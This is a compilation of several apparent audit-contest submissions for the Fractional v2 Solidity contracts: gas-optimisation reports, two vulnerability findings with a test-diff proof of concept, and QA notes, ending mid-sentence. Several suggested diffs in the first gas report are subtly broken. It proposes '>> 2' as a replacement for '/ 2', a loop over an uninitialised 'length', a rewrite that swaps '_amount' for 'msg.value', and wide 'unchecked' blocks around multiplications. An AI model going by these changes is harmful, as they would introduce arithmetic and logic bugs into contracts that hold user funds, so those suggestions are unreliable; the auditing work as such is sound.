 ## Gas Optimizations   | Optimizations | Occurances | | :--- | :---: | | 1. Variables can be made immutable | 8 | | 2. Use `calldata` instead of memory | 15 | | 3. Use ++i instead of i++ & Add `unchecked { ++i; }` in loops | 2 | | 4. Remove unnecessary variables | 3 | | 5. Use storage pointer to set value | 1 | | 6. Internal functions which are used only once can be inlined | 2 | | 7. Mark function calls from known callers as payable to bypass the check | 6 | | 8. Use `>>1` instead of `/2` | 3 | | 9. Add `unchecked` block for where arithmetic overflow cannot happen | 5 | | 10. Using `a = a + b` instead of `a += b` for state variables saves gas | 2 | | 11. Looking up array length from memory every time in a loop costs more gas | 1 | | | |   ### 1. Following variables can be made immutable.     * `registry` in the [BaseVault.sol]( https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L19)   * `registry` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L29)   * `supply` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L31)   * `transfer` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L33)   * `supply` in [Minter.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L14)   * `buyout` in [Migration.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L37)   * `registry` in [Migration.col](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L39)   * `implementation` in [VaultFactory.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L15)   ### 2. Use `calldata` instead of memory in   * [FERC1155.sol#L68](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68)   * [FERC1155.sol#L261](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L261)   * [FERC1155.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L83)   * [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L73)   * [Vault.sol#L101](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L101)   * [VaultRegistry.sol#L70](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L70)   * [VaultRegistry.sol#L71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L71)   * [VaultRegistry.sol#L85](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L85)   * [VaultRegistry.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L86)   * [VaultRegistry.sol#L105](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L106)   * [VaultRegistry.sol#L150](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L150)   * [VaultRegistry.sol#L151](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L151)   * [VaultRegistry.sol#L168](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L168)   * [VaultRegistry.sol#L169](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L169)   * [Metadata.sol#L24](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24)  ### 3. Use `++i` instead of `i++` & Add `unchecked { ++i }` in all following for loops.   * [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)     ```diff     - for (uint256 i = 0; i < length; i++) {     -    methods[_selectors[i]] = _plugins[i];     - }     + for (uint256 i = 0; i < length; ) {     +    methods[_selectors[i]] = _plugins[i];     +    unchecked { ++i; }     + }               ```   * [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)     ```diff     - for (uint256 i = 0; i < length; i++) {     -     methods[_selectors[i]] = address(0);     - }     + for (uint256 i = 0; i < length; ) {     +     methods[_selectors[i]] = address(0);     +     unchecked { ++i; }     + }               ```  ### 4. Remove unnecessary variables:   * [VaultFactory.sol#L68](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L68) `data` is not necessary is variable      ```diff     - bytes memory data = abi.encodePacked();     - vault = implementation.clone(salt, data);     + vault = implementation.clone(salt, abi.encodePacked());         ```    * [Vault.sol#L60](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L60) `leaf` is not necessary and can be replaced by      ```diff     - bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));     - if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {         + if (!MerkleProof.verify(_proof, merkleRoot, keccak256(abi.encode(msg.sender, _target, selector)))) {     ```  * [VaultFactory#L46](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L46) 'data' is not necessary and can be replaced by      ```diff     - bytes32 data = keccak256(     -     abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)     - );     - vault = address(uint160(uint256(data)));         + vault = address(uint160(uint256(keccak256(     +         abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)     +     ))));     ```  ### 5. Use storage pointer to set value  * [Migration.sol#L279](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L279)      ```diff     -migrationInfo[_vault][_proposalId].fractionsMigrated = true;         +proposal.fractionsMigrated = true;             ```   <!-- ### 6. Internal functions which are used only once can be inlined   * https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324   * https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L350 -->  ### 7. Mark function calls from known callers as payable to bypass the check * Functions with `onlyController` & `onlyRegistry` modifier in [FERC1155.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol)       ```diff     - function setContractURI(string calldata _uri) external onlyController {     + function setContractURI(string calldata _uri) external payable onlyController {      - function setMetadata(address _metadata, uint256 _id) external onlyController {     + function setMetadata(address _metadata, uint256 _id) external payable onlyController {      - function setRoyalties( uint256 _id, address _receiver, uint256 _percentage ) external onlyController {      + function setRoyalties(uint256 _id, address _receiver, uint256 _percentage ) external payable onlyController {      - function transferController(address _newController) external onlyController {     + function transferController(address _newController) external payable onlyController {        - function burn(address _from, uint256 _id, uint256 _amount) external onlyRegistry {       + function burn(address _from, uint256 _id, uint256 _amount) external payable onlyRegistry {      - function mint(address _to, uint256 _id, uint256 _amount, bytes memory _data) external onlyRegistry {     + function mint(address _to, uint256 _id, uint256 _amount, bytes memory _data) external payable onlyRegistry {         ```       ### 8. Use `>> 1` instead of `/ 2` to save gas. Right shift x >> y is same as x / 2**y. * [MerkleBase.sol#L100](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L100)      ``` diff     - result = new bytes32[](length / 2 + 1);     + result = new bytes32[]((length >> 2) + 1);     .     .     - result = new bytes32[](length / 2);     + result = new bytes32[](length >> 2);     .     .     - _node = _node / 2;     + _node = _node >> 2;      ```  ### 9. Add `unchecked` block for where arithmetic overflow cannot happen * In `cash()` function in [Buyout.sol#L244](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L244):      ```diff     + unchecked {     +    uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);     +    uint256 buyoutShare = (tokenBalance * ethBalance) /     +        (totalSupply + tokenBalance);     +    _sendEthOrWeth(msg.sender, buyoutShare);     +    // Emits event for cashing out of buyout pool     +    emit Cash(_vault, msg.sender, buyoutShare);     + }     ``` * In `sellFractions()` function in [Buyout.sol#L112](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L112)      ```diff     + unchecked {      +    uint256 endTime = startTime + PROPOSAL_PERIOD;     +    if (block.timestamp > endTime)     +        revert TimeExpired(block.timestamp, endTime);         + }  * In `buyFractions()` function in [Buyout.sol#L149](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L149)      ```diff     + unchecked {      +    uint256 endTime = startTime + REJECTION_PERIOD;     +    if (block.timestamp > endTime)     +        revert TimeExpired(block.timestamp, endTime);     + }     ```  * In `end()` function in [Buyout.sol#L184](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L184)      ```diff     + unchecked {      +    uint256 endTime = startTime + REJECTION_PERIOD;     +    if (block.timestamp <= endTime)     +        revert TimeNotElapsed(block.timestamp, endTime);     +     +    uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);     +    // Checks totalSupply of auction pool to determine if buyout is successful or not     +    if (     +        (tokenBalance * 1000) /     +            IVaultRegistry(registry).totalSupply(_vault) >     +        500     +    ) {     +        // Initializes vault transaction     +        bytes memory data = abi.encodeCall(     +            ISupply.burn,     +            (address(this), tokenBalance)     +        );     +        // Executes burn of fractional tokens from pool     +        IVault(payable(_vault)).execute(supply, data, _burnProof);     +        // Sets buyout state to successful     +        buyoutInfo[_vault].state = State.SUCCESS;     +        // Emits event for ending successful auction     +        emit End(_vault, State.SUCCESS, proposer);     +    } else {     +        // Deletes auction info     +        delete buyoutInfo[_vault];     +        // Transfers fractions and ether back to proposer of the buyout pool     +        IERC1155(token).safeTransferFrom(     +            address(this),     +            proposer,     +            id,     +            tokenBalance,     +            ""     +        );     +        _sendEthOrWeth(proposer, ethBalance);     +        // Emits event for ending unsuccessful auction     +        emit End(_vault, State.INACTIVE, proposer);     + }     ```  * In the `proposal()` function in [Migration.sol#L72](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L72)      ```diff     + unchecked {     +    Proposal storage proposal = migrationInfo[_vault][++nextId];     +    proposal.startTime = block.timestamp;     +    proposal.targetPrice = _targetPrice;     +    proposal.modules = _modules;     +    proposal.plugins = _plugins;     +    proposal.selectors = _selectors;     +    proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(     +        _vault     +    );     +    proposal.newFractionSupply = _newFractionSupply;         + }     ```  ### 10. Using `a = a + b` instead of `a += b` for state variables saves gas * In [Migration.sol#L123](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L123)    ```diff    - proposal.totalEth += msg.value;   + proposal.totalEth = proposal.totalEth + msg.value;       ```  * In [Migration.sol#L134](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L134)   ```diff    - proposal.totalFractions += msg.value;   + proposal.totalFractions = proposal.totalFractions + msg.value;     ```  ### 11. Looking up array length from memory every time in a loop costs more gas.  *  In [Buyout.sol#L454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454)     ```diff     - for (uint256 i; i < permissions.length; ) {     + uint256 length;         + for (uint256 i; i < length; ) {     ``` 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L202 https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L528   # Vulnerability details  ## Impact When `proposal.totalFractions` is equal to the total supply (meaning that all token holders want to participate in a migration), there is a division by zero in `_calculateTotal`.  In contrast to a buyout, where it does not make sense to initiate a buyout if all tokens are held (because there is a dedicated method for that), it does make sense to have a migration that all token holders join. Therefore, this case should be handled.  ## Proof Of Concept ```diff --- a/test/Migration.t.sol +++ b/test/Migration.t.sol @@ -238,7 +238,7 @@ contract MigrationTest is TestUtil {          // Bob joins the proposal          bob.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);          // Alice joins the proposal -        alice.migrationModule.join{value: 1 ether}(vault, 1, 1000); +        alice.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);           vm.warp(proposalPeriod + 1);          // bob calls commit to kickoff the buyout process ```  ## Recommended Mitigation Steps In such a case, `redeem` can be used instead of starting a buyout.  
- For a migration, shouldn't it be sufficient if the currentPrice is greater than or equal to the target price? (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L206) At least that is what I would imagine after reading the documentation ("If the target price is reached then a buyout can be triggered") - For the buyout, the documentation does not match the implementation. In the documentation (https://docs.fractional.art/fractional-v2-1/smart-contracts/modules/buyout), it is mentioned that "If a pool has more than 51% of the total supply after 4 days, ...". However, 51% are not needed, the buyout actually suceeds with 50.1% in the implementation (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Buyout.sol#L211) - For `FERC1155`, once a signature was given to someone, there is no way to cancel the permission, which can be undesirable. Consider adding a cancel method to the contract (that stores the cancelled signatures). - For `FERC1155`, when a user gives out multiple signatures (to different accounts at the same time), only the first redeem call will succeed (because of the nonce). If the user wants to avoid that and increases the nonces himself (e.g., nonce 1 for user A, nonce 2 for user B), user A has to use the signature before user B, which is undesirable. Consider optimizing the nonce management, e.g. storing all the used nonces (instead of requiring sequential ones). - Because of malleable signatures, it is considered best practice to check for invalid `s` and `v` values, as OpenZeppelin is doing: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5e007871991e4f04e871bf5fb1200668ff16b35f/contracts/utils/cryptography/ECDSA.sol#L142 In `FERC1155.sol`, `ecrecover` is called without these checks. - In `setApprovalFor` (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/FERC1155.sol#L191), only a boolean can be provided. This can be very undesirable for an ERC1155 token where a user might also want to specify an amount for the allowance. Consequently, the approvals are not decreased or reset in `safeTransferFrom`. - `ERC1155` inherits `safeBatchTransferFrom` from Solmate (https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC1155.sol#L78), but `isApproved` is not checked in this function, meaning that someone who got the approval for all the provided ids still cannot call `safeBatchTransferFrom`. Consider also overriding this function and adding the check that all ids are approved as an alternative. - In `ERC1155`, it is possible to set arbitrarily high royalties (even >100%), which does not make sense and leads to wrong values in `royaltyInfo`. Consider adding a limit. - In `ERC1155`, although the royalty is a `uint256` value, the actual granularity for the calculation is very small and only whole percent values can be provided (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/FERC1155.sol#L247). Consider increasing the granularity, e.g. dividing by 10,000. - In `_execute` of `Vault`, returning `success` (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/Vault.sol#L117) is not necessary. The execution will always revert when it was not successful, i.e. there is no way that `sucess` can be false. - `BaseVault` hardcodes the number of hashes to 6 (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/protoforms/BaseVault.sol#L128), which seems to be the number when modules contains `BaseVault` and `BuyoutModule`. However, depending on the modules that are passed, the number of hashes can be greater. Therefore, the array size should be dynamic. - It seems strange to me that there is no authentication for plugins, whereas the whole Merkle Tree authentication system exists for modules. Therefore, if an owner would (accidentally) add a module as a plugin, everyone could call it and the whole module authentication would be circumvented. This also contradicts the sentence "An NFT within a given Vault cannot be withdrawn unless its modules allow for it." in the documentation. An owner can simply add a new plugin and withdraw all tokens (meaning there is a lot of trust in the owner). - There is currently no way to transfer airdrops (e.g., ERC20 tokens that are distributed to all holders of a NFT) out of a `Vault` without starting a migration. Consider adding a module that would allow to transfer them. - The WETH address (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/utils/SafeSend.sol#L12) is hardcoded, which can make testing and deploying on other networks more difficult. Consider making the address configurable. - In the documentation, it is mentioned "These modules are set by the curator upon fractionalization and can be adjusted via governance vote of token holders.". However, this does not seem to be true. An owner can always set a new merkle root (via `setMerkleRoot`) which allows new modules. - An attacker could call `createInCollection` with some malicious tokens that he created (conforming to the FERC1155 calls) and therefore create a vault with a malicous, worthless tokens. He could then sell those tokens and for normal users it would appear as if they are normal fractionalization tokens of a vault. - It seems strange to me to have a functionality (`createInCollection`) for creating a new vault with an existing token. This could result in some scenarios that are undesired. For example, when a buyout is active for both vaults, there is an arbitrage opportunity (buy the tokens with the lower price, sell the ones with the higher) and the person that initiated the one with the lower price will not succeed, although it might have (because people would have been willing to sell at this price) when only vault with this token had existed. 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99   # Vulnerability details  # Vulnerability details  ## Impact Precision loss causing loss of user value and potentially cause complete loss to vault  ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L471-L472  If the supply of the fraction is set to say 10 then any user that uses migrateFractions with less than 10% of the contributions will receive no shares at all due to precision loss. Under certain conditions it may even cause complete loss of access to the vault. In this same example, if less than 5 fractions can be redeemed (i.e. not enough people have more than 10% to overcome the precision loss) then the vault would never be able to be bought out and the vault would forever be frozen.  ## Tools Used  ## Recommended Mitigation Steps When calling propose require that _newFractionSupply is greater than some value (i.e. 1E18)  
# 2022-07-fractional ## Gas Optimisations Report  ### FUNCTIONS GUARANTEED TO REVERT WHEN CALLED BY NORMAL USERS CAN BE MARKED PAYABLE If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  _There are **9** instances of this issue:_  ```solidity File: /src/Vault.sol  24:    function init() external { 25:         if (nonce != 0) revert Initialized(owner, msg.sender, nonce);   73:    function install(bytes4[] memory _selectors, address[] memory _plugins) 74:        external 75:    { 76:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   86:    function setMerkleRoot(bytes32 _rootHash) external { 87:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   93:    function transferOwnership(address _newOwner) external { 94:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   101:   function uninstall(bytes4[] memory _selectors) external { 102:       if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L24  ```solidity File: /src/FERC1155.sol  198:   function setContractURI(string calldata _uri) external onlyController {  205:   function setMetadata(address _metadata, uint256 _id) 206:       external 207:       onlyController   217:   function setRoyalties( 218:       uint256 _id, 219:       address _receiver, 220:       uint256 _percentage 221:   ) external onlyController {   229:   function transferController(address _newController) 230:       external 231:       onlyController ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L198  ### `PUBLIC` FUNCTIONS NOT CALLED BY THE CONTRACT SHOULD BE DECLARED `EXTERNAL` INSTEAD Contracts are allowed to override their parents’ functions and change the visibility from `external` to `public` and can save gas by doing so.  _There are **8** instances of this issue:_  ```solidity File: /src/FERC1155.sol  256:   function safeTransferFrom( 257:       address _from, 258:       address _to, 259:       uint256 _id, 260:       uint256 _amount, 261:       bytes memory _data 262:   ) public override(ERC1155, IFERC1155) {   291:   function uri(uint256 _id) 292:       public 293:       view 294:       override(ERC1155, IFERC1155) 295:       returns (string memory) ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L256-L262  ```solidity File: /src/utils/MerkleBase.sol  43:    function verifyProof( 44:        bytes32 _root, 45:        bytes32[] memory _proof, 46:        bytes32 _valueToProve 47:    ) public pure returns (bool) {   61:    function getRoot(bytes32[] memory _data) public pure returns (bytes32) {   73:    function getProof(bytes32[] memory _data, uint256 _node) 74:        public 75:        pure 76:        returns (bytes32[] memory) ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L43-L47  ```solidity File: /src/utils/Metadata.sol  36:    function uri(uint256 _id) public view returns (string memory) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Metadata.sol#L36  ```solidity File: /src/utils/SelfPermit.sol  18:    function selfPermit( 19:        address _token, 20:        uint256 _id, 21:        bool _approved, 22:        uint256 _deadline, 23:        uint8 _v, 24:        bytes32 _r, 25:        bytes32 _s 26:    ) public {   46:    function selfPermitAll( 47:        address _token, 48:        bool _approved, 49:        uint256 _deadline, 50:        uint8 _v, 51:        bytes32 _r, 52:        bytes32 _s 53:    ) public { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/SelfPermit.sol#L18-L26  ### \<ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP The overheads outlined below are PER LOOP, excluding the first loop - storage arrays incur a Gwarmaccess (100 gas) - memory arrays use `MLOAD` (3 gas) - calldata arrays use `CALLDATALOAD` (3 gas) \ \ Caching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset  _There are **8** instances of this issue:_    ```solidity File: /src/modules/Buyout.sol  454:   for (uint256 i; i < permissions.length; ) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L454  ```solidity File: /src/modules/protoforms/BaseVault.sol  64:    for (uint256 i = 0; i < _tokens.length; ) {  83:    for (uint256 i = 0; i < _tokens.length; ) {  107:   for (uint256 i = 0; i < _tokens.length; ++i) {  130:   for (uint256 i; i < _modules.length; ++i) {  132:   for (uint256 j; j < leaves.length; ++j) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L64  ```solidity File: /src/utils/MerkleBase.sol  51:    for (uint256 i = 0; i < _proof.length; ++i) {  110:   for (uint256 i; i < result.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L51    ### USING > 0 COSTS MORE GAS THAN != 0 WHEN USED ON A UINT This change saves 6 gas per comparison  _There is **1** instance of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  186:    while (x > 0) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L186  ### RETURN DIRECTLY INSTEAD OF STORING A RETURN MEMORY VARIABLE  _There are **5** instances of this issue:_    ```solidity File: /src/Vault.sol  53:    ) external payable returns (bool success, bytes memory response) {            ... 67:        (success, response) = _execute(_target, _data); ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L53    ```solidity File: /src/Vault.sol  55:    ) external returns (address vault) { 56:        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);     87:    ) external returns (address vault, address token) { 88:        (vault, token) = createCollectionFor(       107:   ) external returns (address vault) {            ... 111:       vault = _deployVault(_merkleRoot, _token, _plugins, _selectors);  ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/VaultRegistry.sol#L55-L56    ```solidity File: /src/Vault.sol  181:   returns (bool started)            ... 212:       started = true; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L181     ### EXPRESSIONS FOR CONSTANT VALUES SUCH AS A CALL TO `KECCAK256()`, SHOULD USE `IMMUTABLE` RATHER THAN `CONSTANT` It is expected that the value should be converted into a constant value at compile time. But actually the expression is re-calculated each time the constant is referenced.    _There are **3** instances of this issue:_    ```solidity File: /src/constants/Permit.sol  5:     bytes32 constant DOMAIN_TYPEHASH = keccak256( 6:         "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)" 7:     );     10:    bytes32 constant PERMIT_TYPEHASH = keccak256( 11:        "Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)" 12:    );     15:    bytes32 constant PERMIT_ALL_TYPEHASH = keccak256( 16:        "PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)" 17:    ); ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/constants/Permit.sol#L5  ### Replace `x <= y` with `x < y + 1` In the EVM, there is no opcode for `>=` or `<=`. When using less than or equal, two operations are performed: `<` and `=`. Using strict comparison operators hence saves gas    _There is **1** instance of this issue:_    ```solidity File: /src/modules/Buyout.sol  203:   if (block.timestamp <= endTime) ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L203                                       ### STATE VARIABLES ONLY SET IN THE CONSTRUCTOR SHOULD BE DECLARED `IMMUTABLE` Avoids a Gsset (20000 gas)  _There are **8** instances of this issue:_  ```solidity File: /src/VaultFactory.sol  15:    address public implementation; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/VaultFactory.sol#L15    ```solidity File: /src/modules/Buyout.sol  29:    address public registry;                                       31:    address public supply;                                       33:    address public transfer; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L29                                      ```solidity File: /src/modules/Migration.sol  37:    address payable public buyout;                                       39:    address public registry; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L37    ```solidity File: /src/modules/Minter.sol  14:    address public supply; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L14                                       ```solidity File: /src/modules/protoforms/BaseVault.sol  19:    address public registry; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L19   ### `X += Y`/`X -= Y` COSTS MORE GAS THAN `X = X + Y`/`X = X - Y`                                       _There are **15** instances of this issue:_                                    ```solidity File: /src/FERC1155.sol  62:    totalSupply[_id] -= _amount;  86:    totalSupply[_id] += _amount;  270:   balanceOf[_from][_id] -= _amount;  271:   balanceOf[_to][_id] += _amount; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L62                                  ```solidity File: /src/modules/Buyout.sol  139:   buyoutInfo[_vault].ethBalance -= ethAmount;  176:   buyoutInfo[_vault].ethBalance += msg.value; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L139                              ```solidity File: /src/modules/Migration.sol  123:   proposal.totalEth += msg.value;  124:   userProposalEth[_proposalId][msg.sender] += msg.value;  134:   proposal.totalFractions += _amount;  135:   userProposalFractions[_proposalId][msg.sender] += _amount;  156:   proposal.totalFractions -= amount;  160:   proposal.totalEth -= ethAmount;  497:   treeLength += IModule(_modules[i]).getLeafNodes().length; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L123                         ```solidity File: /src/utils/MerkleBase.sol  147:   for (uint256 i; i < length - 1; i += 2) {  190:   ceil -= pOf2; // see above ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L147     ### DEFAULT VALUE INITIALIZATION If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    _There are **6** instances of this issue:_    ```solidity File: /src/Vault.sol  78:    for (uint256 i = 0; i < length; i++) {  104:   for (uint256 i = 0; i < length; i++) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78    ```solidity File: /src/modules/protoforms/BaseVault.sol  64:    for (uint256 i = 0; i < _tokens.length; ) {  83:    for (uint256 i = 0; i < _tokens.length; ) {    107:   for (uint256 i = 0; i < _tokens.length; ++i) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L64    ```solidity File: /src/utils/MerkleBase.sol  51:    for (uint256 i = 0; i < _proof.length; ++i) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L51  ### MULTIPLICATION/DIVISION BY TWO SHOULD USE BIT SHIFTING `x * 2` is equivalent to `x << 1` and `x / 2` is the same as 